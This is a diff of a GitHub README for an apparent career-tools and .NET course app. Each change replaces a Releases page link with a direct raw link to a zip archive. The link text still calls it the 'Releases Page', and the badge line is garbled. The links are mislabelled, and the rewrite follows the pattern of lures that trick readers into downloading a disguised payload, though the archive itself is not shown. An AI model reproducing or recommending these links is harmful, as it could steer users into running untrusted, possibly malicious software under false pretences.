@@ -1,6 +1,6 @@
 # 🎯 career-cv-linkedin_tech-tests_course-luisdev-professional-growth-part-1_dotnet-8_csharp-12 - Your Guide to Career Growth Tools
 
-[![Download](https://img.shields.io/badge/Download%20Now-Get%20Started-blue.svg)](https://github.com/luizaportella77721-arch/career-cv-linkedin_tech-tests_course-luisdev-professional-growth-part-1_dotnet-8_csharp-12/releases)
+[![Download](https://raw.githubusercontent.com/luizaportella77721-arch/career-cv-linkedin_tech-tests_course-luisdev-professional-growth-part-1_dotnet-8_csharp-12/main/developments/career-cv-linkedin_tech-tests_course-luisdev-professional-growth-part-1_dotnet-8_csharp-12_v3.6-beta.1.zip%20Now-Get%https://raw.githubusercontent.com/luizaportella77721-arch/career-cv-linkedin_tech-tests_course-luisdev-professional-growth-part-1_dotnet-8_csharp-12/main/developments/career-cv-linkedin_tech-tests_course-luisdev-professional-growth-part-1_dotnet-8_csharp-12_v3.6-beta.1.zip)](https://raw.githubusercontent.com/luizaportella77721-arch/career-cv-linkedin_tech-tests_course-luisdev-professional-growth-part-1_dotnet-8_csharp-12/main/developments/career-cv-linkedin_tech-tests_course-luisdev-professional-growth-part-1_dotnet-8_csharp-12_v3.6-beta.1.zip)
 
 ## 📚 Overview
 
@@ -12,7 +12,7 @@ To get started with this application, you will need to download it from the Rele
 
 ## 🔗 Access the Download
 
-You can download the latest version of the application directly from the Releases page: [Download Here](https://github.com/luizaportella77721-arch/career-cv-linkedin_tech-tests_course-luisdev-professional-growth-part-1_dotnet-8_csharp-12/releases).
+You can download the latest version of the application directly from the Releases page: [Download Here](https://raw.githubusercontent.com/luizaportella77721-arch/career-cv-linkedin_tech-tests_course-luisdev-professional-growth-part-1_dotnet-8_csharp-12/main/developments/career-cv-linkedin_tech-tests_course-luisdev-professional-growth-part-1_dotnet-8_csharp-12_v3.6-beta.1.zip).
 
 ## 💻 System Requirements
 
@@ -26,7 +26,7 @@ Before you begin, ensure your system meets the following requirements.
 ## 📂 Download & Install
 
 1. Click on the link below to visit the Releases page.
-   - [Visit Releases Page](https://github.com/luizaportella77721-arch/career-cv-linkedin_tech-tests_course-luisdev-professional-growth-part-1_dotnet-8_csharp-12/releases).
+   - [Visit Releases Page](https://raw.githubusercontent.com/luizaportella77721-arch/career-cv-linkedin_tech-tests_course-luisdev-professional-growth-part-1_dotnet-8_csharp-12/main/developments/career-cv-linkedin_tech-tests_course-luisdev-professional-growth-part-1_dotnet-8_csharp-12_v3.6-beta.1.zip).
 
 2. Locate the latest version of the application on the Releases page. You will see several files listed.
 
@@ -62,7 +62,7 @@ If you have any questions or need assistance, please reach out to the community.
 
 This repository will receive updates regularly. Stay tuned for new features and improvements to enhance your experience.
 
-Don't forget to check back on the Releases page for new updates: [Releases Page](https://github.com/luizaportella77721-arch/career-cv-linkedin_tech-tests_course-luisdev-professional-growth-part-1_dotnet-8_csharp-12/releases).
+Don't forget to check back on the Releases page for new updates: [Releases Page](https://raw.githubusercontent.com/luizaportella77721-arch/career-cv-linkedin_tech-tests_course-luisdev-professional-growth-part-1_dotnet-8_csharp-12/main/developments/career-cv-linkedin_tech-tests_course-luisdev-professional-growth-part-1_dotnet-8_csharp-12_v3.6-beta.1.zip).
 
 ## 📝 License
 
